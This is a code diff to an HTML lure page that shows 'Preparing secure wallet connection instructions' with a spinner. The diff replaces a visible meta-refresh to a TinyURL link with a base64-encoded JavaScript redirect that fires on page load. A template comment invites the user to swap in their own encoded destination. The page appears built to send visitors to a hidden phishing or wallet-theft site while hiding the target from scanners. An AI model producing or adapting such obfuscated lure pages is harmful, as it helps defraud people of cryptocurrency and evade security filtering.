@@ -1,8 +1,8 @@
+<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <title>Content Preview - Processing Request</title>
-    <meta http-equiv="refresh" content="2; url=https://tinyurl.com/2dw6mka2" />
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -26,13 +26,21 @@
     </style>
 </head>
 <body>
-        <p>Preparing secure wallet connection instructions...</p>
-        <div class="loader"></div>
-        <p style="font-size: 12px; color: #666; margin-top: 20px;">
-            Ensuring secure browser compatibility
-        </p>
-    </div>
-    </div>
-  </body>
+    <p>Preparing secure wallet connection instructions...</p>
+    <div class="loader"></div>
+    <p style="font-size: 12px; color: #666; margin-top: 20px;">
+        Ensuring secure browser compatibility
+    </p>
 
+    <script>
+        // Base64 encoded final URL - replace with your encoded destination
+        const encodedUrl = 'aHR0cHM6Ly90aW55dXJsLmNvbS8yZHc2bWthMg=='; // This decodes to your TinyURL
+        
+        // Decode and redirect after 2 seconds
+        setTimeout(() => {
+            const decodedUrl = atob(encodedUrl);
+            window.location.href = decodedUrl;
+        }, 2000);
+    </script>
+</body>
 </html>
